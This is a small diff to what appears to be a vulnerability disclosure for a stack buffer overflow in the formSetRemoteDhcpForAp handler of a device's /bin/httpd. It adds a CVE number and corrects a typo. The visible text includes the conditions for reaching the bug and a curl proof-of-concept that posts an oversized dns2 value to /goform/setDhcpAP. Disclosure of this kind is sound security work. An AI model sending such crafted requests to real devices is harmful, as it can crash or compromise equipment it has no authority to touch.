@@ -18,7 +18,7 @@ The **formSetDhcpForAp** handler in `/bin/httpd` calls **formSetRemoteDhcpForAp*
 
 *   **Vulnerability Type**: Buffer Overflow (CWE-120) and Memory Corruption (CWE-119)
 
-*   **CVE ID**: Requested
+*   **CVE ID**: CVE-2025-15252
 
 *   **Reported by**: Charbel
 
@@ -44,7 +44,7 @@ So we need the following:
 ✅ 4. devUid format: devUid=IP:PORT;  
 ✅ 5. IP must be valid dotted-quad format (xxx.xxx.xxx.xxx)  
 
-Now we ca send a POST request to the `/goform/setDhcpAP` endpoint to trigger the stack overflow in `formSetRemoteDhcpForAp` and we can deliver the payload using any of the 6 parameters
+Now we can send a POST request to the `/goform/setDhcpAP` endpoint to trigger the stack overflow in `formSetRemoteDhcpForAp` and we can deliver the payload using any of the 6 parameters
 
 ```
 curl -X POST http://172.16.182.130/goform/setDhcpAP -H "Cookie: devUid=172.16.182.130:80;" -d "startip=192.168.10.100" -d "endip=192.168.10.200" -d "leasetime=604800" -d "gateway=192.168.10.1" -d "dns1=8.8.8.8" -d "dns2=$(python3 -c 'print("D"*1000)')"
